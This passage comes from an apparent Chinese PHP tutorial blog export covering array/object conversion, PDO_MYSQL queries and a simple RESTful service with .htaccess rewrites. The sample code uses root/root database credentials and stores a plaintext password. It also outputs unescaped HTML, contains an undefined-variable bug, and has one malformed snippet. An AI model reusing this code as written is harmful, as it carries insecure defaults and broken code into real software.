<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组转换对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_to_object</span>(<span class="params"><span class="variable">$arr</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">gettype</span>(<span class="variable">$arr</span>) != <span class="string">&#x27;array&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">gettype</span>(<span class="variable">$v</span>) == <span class="string">&#x27;array&#x27;</span> || <span class="title function_ invoke__">gettype</span>(<span class="variable">$v</span>) == <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$k</span>] = (<span class="keyword">object</span>)<span class="title function_ invoke__">array_to_object</span>(<span class="variable">$v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">object</span>)<span class="variable">$arr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对象转换数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_to_array</span>(<span class="params"><span class="variable">$obj</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$obj</span> = (<span class="keyword">array</span>)<span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">gettype</span>(<span class="variable">$v</span>) == <span class="string">&#x27;resource&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">gettype</span>(<span class="variable">$v</span>) == <span class="string">&#x27;object&#x27;</span> || <span class="title function_ invoke__">gettype</span>(<span class="variable">$v</span>) == <span class="string">&#x27;array&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$obj</span>[<span class="variable">$k</span>] = (<span class="keyword">array</span>)<span class="title function_ invoke__">object_to_array</span>(<span class="variable">$v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = [[<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;man&#x27;</span>], [<span class="string">&#x27;lisi&#x27;</span>,<span class="string">&#x27;man&#x27;</span>], [<span class="string">&#x27;lisa&#x27;</span>,<span class="string">&#x27;women&#x27;</span>]];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_to_object</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">object_to_array</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>Php 扩展 PDO_MYSQL 简单应用</title>
    <url>/2018/11/php-pdo-mysql/</url>
    <content><![CDATA[<h2 id="PDO-MYSQL-连接数据库"><a href="#PDO-MYSQL-连接数据库" class="headerlink" title="PDO_MYSQL 连接数据库"></a>PDO_MYSQL 连接数据库</h2><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="type">PDO</span>(<span class="string">&#x27;mysql:host=localhost;port=3306;dbname=currency&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    echo <span class="string">&#x27; 数据库连接失败 &#x27;</span>.<span class="variable">$e</span>-&gt;getMessage ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into buyer (username,password,email) values (&#x27;ff&#x27;,&#x27;123456&#x27;,&#x27;admin@admin.com&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="variable">$pdo</span>-&gt;<span class="built_in">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27; 影响行数：&#x27;</span>.<span class="variable">$res</span>;</span><br></pre></td></tr></table></figure>

<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;update buyer set username=&#x27;ff123&#x27; where id&gt;3&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="variable">$pdo</span>-&gt;<span class="built_in">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27; 影响行数：&#x27;</span>.<span class="variable">$res</span>;</span><br></pre></td></tr></table></figure>

<h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from buyer&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$res</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">$sql=&quot;<span class="keyword">delete</span> <span class="keyword">from</span> buyer <span class="keyword">where</span> id&gt;<span class="number">5</span><span class="string">&quot;; */</span></span><br></pre></td></tr></table></figure>

<h2 id="占位符使用"><a href="#占位符使用" class="headerlink" title="占位符使用"></a>占位符使用</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;select * from yang_member where member_id = :id;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;bindParam(<span class="string">&quot;:id&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;fetchAll (<span class="variable constant_">PDO</span><span class="symbol">:</span><span class="symbol">:FETCH_ASSOC</span>); <span class="regexp">//</span> 获取所有数据</span><br><span class="line"><span class="variable">$b</span>-&gt;fetch (<span class="variable constant_">PDO</span><span class="symbol">:</span><span class="symbol">:FETCH_ASSOC</span>);    <span class="regexp">//</span> 获取一条数据</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>PDO_MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 实例 RESTful</title>
    <url>/2018/11/php-restful/</url>
    <content><![CDATA[<h2 id="这里简单介绍个接口实例。"><a href="#这里简单介绍个接口实例。" class="headerlink" title="这里简单介绍个接口实例。"></a>这里简单介绍个接口实例。</h2><p>以下代码是 RESTful 服务类 Site.php</p>
<span id="more"></span>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * RESTful 服务类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Class Site &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sites</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="string">&#x27;TaoBao&#x27;</span>,  </span><br><span class="line">        <span class="number">2</span> =&gt; <span class="string">&#x27;Google&#x27;</span>,  </span><br><span class="line">        <span class="number">3</span> =&gt; <span class="string">&#x27;Runoob&#x27;</span>,              </span><br><span class="line">        <span class="number">4</span> =&gt; <span class="string">&#x27;Baidu&#x27;</span>,              </span><br><span class="line">        <span class="number">5</span> =&gt; <span class="string">&#x27;Weibo&#x27;</span>,  </span><br><span class="line">        <span class="number">6</span> =&gt; <span class="string">&#x27;Sina&#x27;</span></span><br><span class="line">            </span><br><span class="line">    );</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllSite</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sites;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSite</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$site</span> = <span class="keyword">array</span>(<span class="variable">$id</span> =&gt; (<span class="variable language_">$this</span>-&gt;sites[<span class="variable">$id</span>]) ? <span class="variable language_">$this</span>-&gt;sites[<span class="variable">$id</span>] : <span class="variable language_">$this</span>-&gt;sites[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$site</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>RESTful Services URI 映射 </p>
<p>RESTful Services URI 应该设置为一个直观简短的资源地址。Apache 服务器的 .htaccess 应设置好对应的 Rewrite 规则。  </p>
<p>本实例我们将使用两个 URI 规则</p>
<p>1、获取所有站点列表：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/restexample/</span>site<span class="regexp">/list/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2、使用 id 获取指定的站点，以下 URI 为获取 id 为 3 的站点：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/restexample/</span>site<span class="regexp">/list/</span><span class="number">3</span>/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>项目的 .htaccess 文件配置规则如下所示：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启 rewrite 功能</span></span><br><span class="line"><span class="attribute">Options</span> +FollowSymlinks</span><br><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重写规则</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^site/list/$   RestController.php?view=<span class="literal">all</span><span class="meta"> [nc,qsa]</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^site/list/([<span class="number">0</span>-<span class="number">9</span>]+)/$   RestController.php?view=single&amp;id=$<span class="number">1</span><span class="meta"> [nc,qsa]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>RESTful Web Service 控制器  </p>
<p>在 .htaccess 文件中，我们通过设置参数 ‘view’ 来获取 RestController.php 文件中对应的请求，通过获取 ‘view’ 不同的参数来分发到不同的方法上。RestController.php 文件代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;SiteRestHandler.php&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="variable">$view</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;view&quot;</span>]))</span><br><span class="line">    <span class="variable">$view</span> = <span class="variable">$_GET</span>[<span class="string">&quot;view&quot;</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * RESTful service 控制器</span></span><br><span class="line"><span class="comment"> * URL 映射</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$view</span>)&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;all&quot;</span>:</span><br><span class="line">        <span class="comment">// 处理 REST Url /site/list/</span></span><br><span class="line">        <span class="variable">$siteRestHandler</span> = <span class="keyword">new</span> <span class="title class_">SiteRestHandler</span>();</span><br><span class="line">        <span class="variable">$siteRestHandler</span>-&gt;<span class="title function_ invoke__">getAllSites</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;single&quot;</span>:</span><br><span class="line">        <span class="comment">// 处理 REST Url /site/show/&lt;id&gt;/</span></span><br><span class="line">        <span class="variable">$siteRestHandler</span> = <span class="keyword">new</span> <span class="title class_">SiteRestHandler</span>();</span><br><span class="line">        <span class="variable">$siteRestHandler</span>-&gt;<span class="title function_ invoke__">getSite</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;&quot;</span> :</span><br><span class="line">        <span class="comment">//404 - not found;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的 RESTful 基础类  </p>
<p>以下提供了 RESTful 的一个基类，用于处理响应请求的 HTTP 状态码，SimpleRest.php 文件代码如下</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 一个简单的 RESTful web services 基类</span></span><br><span class="line"><span class="comment"> * 我们可以基于这个类来扩展需求</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleRest</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $httpVersion = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setHttpHeaders</span><span class="params">($contentType, $statusCode)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        $statusMessage = $this -&gt; getHttpStatusMessage($statusCode);</span><br><span class="line">        </span><br><span class="line">        header($this-&gt;httpVersion. <span class="string">&quot; &quot;</span>. $statusCode .<span class="string">&quot; &quot;</span>. $statusMessage);        </span><br><span class="line">        header(<span class="string">&quot;Content-Type:&quot;</span>. $contentType);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHttpStatusMessage</span><span class="params">($statusCode)</span></span>&#123;</span><br><span class="line">        $httpStatus = <span class="keyword">array</span>(</span><br><span class="line">            <span class="number">100</span> =&gt; <span class="string">&#x27;Continue&#x27;</span>,  </span><br><span class="line">            <span class="number">101</span> =&gt; <span class="string">&#x27;Switching Protocols&#x27;</span>,  </span><br><span class="line">            <span class="number">200</span> =&gt; <span class="string">&#x27;OK&#x27;</span>,</span><br><span class="line">            <span class="number">201</span> =&gt; <span class="string">&#x27;Created&#x27;</span>,  </span><br><span class="line">            <span class="number">202</span> =&gt; <span class="string">&#x27;Accepted&#x27;</span>,  </span><br><span class="line">            <span class="number">203</span> =&gt; <span class="string">&#x27;Non-Authoritative Information&#x27;</span>,  </span><br><span class="line">            <span class="number">204</span> =&gt; <span class="string">&#x27;No Content&#x27;</span>,  </span><br><span class="line">            <span class="number">205</span> =&gt; <span class="string">&#x27;Reset Content&#x27;</span>,  </span><br><span class="line">            <span class="number">206</span> =&gt; <span class="string">&#x27;Partial Content&#x27;</span>,  </span><br><span class="line">            <span class="number">300</span> =&gt; <span class="string">&#x27;Multiple Choices&#x27;</span>,  </span><br><span class="line">            <span class="number">301</span> =&gt; <span class="string">&#x27;Moved Permanently&#x27;</span>,  </span><br><span class="line">            <span class="number">302</span> =&gt; <span class="string">&#x27;Found&#x27;</span>,  </span><br><span class="line">            <span class="number">303</span> =&gt; <span class="string">&#x27;See Other&#x27;</span>,  </span><br><span class="line">            <span class="number">304</span> =&gt; <span class="string">&#x27;Not Modified&#x27;</span>,  </span><br><span class="line">            <span class="number">305</span> =&gt; <span class="string">&#x27;Use Proxy&#x27;</span>,  </span><br><span class="line">            <span class="number">306</span> =&gt; <span class="string">&#x27;(Unused)&#x27;</span>,  </span><br><span class="line">            <span class="number">307</span> =&gt; <span class="string">&#x27;Temporary Redirect&#x27;</span>,  </span><br><span class="line">            <span class="number">400</span> =&gt; <span class="string">&#x27;Bad Request&#x27;</span>,  </span><br><span class="line">            <span class="number">401</span> =&gt; <span class="string">&#x27;Unauthorized&#x27;</span>,  </span><br><span class="line">            <span class="number">402</span> =&gt; <span class="string">&#x27;Payment Required&#x27;</span>,  </span><br><span class="line">            <span class="number">403</span> =&gt; <span class="string">&#x27;Forbidden&#x27;</span>,  </span><br><span class="line">            <span class="number">404</span> =&gt; <span class="string">&#x27;Not Found&#x27;</span>,  </span><br><span class="line">            <span class="number">405</span> =&gt; <span class="string">&#x27;Method Not Allowed&#x27;</span>,  </span><br><span class="line">            <span class="number">406</span> =&gt; <span class="string">&#x27;Not Acceptable&#x27;</span>,  </span><br><span class="line">            <span class="number">407</span> =&gt; <span class="string">&#x27;Proxy Authentication Required&#x27;</span>,  </span><br><span class="line">            <span class="number">408</span> =&gt; <span class="string">&#x27;Request Timeout&#x27;</span>,  </span><br><span class="line">            <span class="number">409</span> =&gt; <span class="string">&#x27;Conflict&#x27;</span>,  </span><br><span class="line">            <span class="number">410</span> =&gt; <span class="string">&#x27;Gone&#x27;</span>,  </span><br><span class="line">            <span class="number">411</span> =&gt; <span class="string">&#x27;Length Required&#x27;</span>,  </span><br><span class="line">            <span class="number">412</span> =&gt; <span class="string">&#x27;Precondition Failed&#x27;</span>,  </span><br><span class="line">            <span class="number">413</span> =&gt; <span class="string">&#x27;Request Entity Too Large&#x27;</span>,  </span><br><span class="line">            <span class="number">414</span> =&gt; <span class="string">&#x27;Request-URI Too Long&#x27;</span>,  </span><br><span class="line">            <span class="number">415</span> =&gt; <span class="string">&#x27;Unsupported Media Type&#x27;</span>,  </span><br><span class="line">            <span class="number">416</span> =&gt; <span class="string">&#x27;Requested Range Not Satisfiable&#x27;</span>,  </span><br><span class="line">            <span class="number">417</span> =&gt; <span class="string">&#x27;Expectation Failed&#x27;</span>,  </span><br><span class="line">            <span class="number">500</span> =&gt; <span class="string">&#x27;Internal Server Error&#x27;</span>,  </span><br><span class="line">            <span class="number">501</span> =&gt; <span class="string">&#x27;Not Implemented&#x27;</span>,  </span><br><span class="line">            <span class="number">502</span> =&gt; <span class="string">&#x27;Bad Gateway&#x27;</span>,  </span><br><span class="line">            <span class="number">503</span> =&gt; <span class="string">&#x27;Service Unavailable&#x27;</span>,  </span><br><span class="line">            <span class="number">504</span> =&gt; <span class="string">&#x27;Gateway Timeout&#x27;</span>,  </span><br><span class="line">            <span class="number">505</span> =&gt; <span class="string">&#x27;HTTP Version Not Supported&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ($httpStatus[$statusCode]) ? $httpStatus[$statusCode] : $status[<span class="number">500</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>RESTful Web Service 处理类  </p>
<p>以下是一个 RESTful Web Service 处理类 SiteRestHandler.php，继承了上面我们提供的 RESTful 基类，类中通过判断请求的参数来决定返回的 HTTP 状态码及数据格式，实例中我们提供了三种数据格式： “application&#x2F;json” 、 “application&#x2F;xml” 或 “text&#x2F;html”：  </p>
<p>SiteRestHandler.php 文件代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;SimpleRest.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;Site.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SiteRestHandler</span> <span class="keyword">extends</span> <span class="title">SimpleRest</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getAllSites</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line"> </span><br><span class="line">        <span class="variable">$site</span> = <span class="keyword">new</span> <span class="title class_">Site</span>();</span><br><span class="line">        <span class="variable">$rawData</span> = <span class="variable">$site</span>-&gt;<span class="title function_ invoke__">getAllSite</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$rawData</span>)) &#123;</span><br><span class="line">            <span class="variable">$statusCode</span> = <span class="number">404</span>;</span><br><span class="line">            <span class="variable">$rawData</span> = <span class="keyword">array</span>(<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;No sites found!&#x27;</span>);        </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$statusCode</span> = <span class="number">200</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$requestContentType</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">setHttpHeaders</span>(<span class="variable">$requestContentType</span>, <span class="variable">$statusCode</span>);</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$requestContentType</span>,<span class="string">&#x27;application/json&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encodeJson</span>(<span class="variable">$rawData</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$requestContentType</span>,<span class="string">&#x27;text/html&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encodeHtml</span>(<span class="variable">$rawData</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$requestContentType</span>,<span class="string">&#x27;application/xml&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encodeXml</span>(<span class="variable">$rawData</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encodeHtml</span>(<span class="params"><span class="variable">$responseData</span></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$htmlResponse</span> = <span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$responseData</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$htmlResponse</span> .= <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>. <span class="variable">$key</span>. <span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>. <span class="variable">$value</span>. <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$htmlResponse</span> .= <span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$htmlResponse</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encodeJson</span>(<span class="params"><span class="variable">$responseData</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$jsonResponse</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$responseData</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$jsonResponse</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encodeXml</span>(<span class="params"><span class="variable">$responseData</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 创建 SimpleXMLElement 对象</span></span><br><span class="line">        <span class="variable">$xml</span> = <span class="keyword">new</span> <span class="title class_">SimpleXMLElement</span>(<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;site&gt;&lt;/site&gt;&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$responseData</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">addChild</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">asXML</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSite</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$site</span> = <span class="keyword">new</span> <span class="title class_">Site</span>();</span><br><span class="line">        <span class="variable">$rawData</span> = <span class="variable">$site</span>-&gt;<span class="title function_ invoke__">getSite</span>(<span class="variable">$id</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$rawData</span>)) &#123;</span><br><span class="line">            <span class="variable">$statusCode</span> = <span class="number">404</span>;</span><br><span class="line">            <span class="variable">$rawData</span> = <span class="keyword">array</span>(<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;No sites found!&#x27;</span>);        </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$statusCode</span> = <span class="number">200</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$requestContentType</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">setHttpHeaders</span>(<span class="variable">$requestContentType</span>, <span class="variable">$statusCode</span>);</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$requestContentType</span>,<span class="string">&#x27;application/json&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encodeJson</span>(<span class="variable">$rawData</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$requestContentType</span>,<span class="string">&#x27;text/html&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encodeHtml</span>(<span class="variable">$rawData</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$requestContentType</span>,<span class="string">&#x27;application/xml&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encodeXml</span>(<span class="variable">$rawData</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后我们这样访问我们写的接口</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/site/</span>list/ </span><br><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/site/</span>list<span class="regexp">/1/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

